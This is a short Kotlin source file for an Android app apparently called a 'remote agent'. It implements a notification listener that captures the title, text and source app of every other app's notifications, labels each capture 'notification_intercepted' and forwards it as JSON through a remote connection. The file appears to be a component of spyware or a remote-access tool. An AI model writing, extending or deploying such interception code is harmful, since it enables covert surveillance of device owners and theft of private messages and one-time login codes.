package com.kero.remoteagent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

class KeroNotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let {
            try {
                val extras = it.notification.extras
                val title = extras.getCharSequence("android.title")?.toString() ?: "بدون عنوان"
                val text = extras.getCharSequence("android.text")?.toString() ?: "بدون نص"
                val packageName = it.packageName
                if (packageName == applicationContext.packageName) return
                val msg = JSONObject().apply {
                    put("type", "notification_intercepted")
                    put("package", packageName)
                    put("title", title)
                    put("text", text)
                    put("time", it.postTime)
                }
                RemoteConnection.sendJson(msg)
            } catch (e: Exception) { e.printStackTrace() }
        }
    }
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}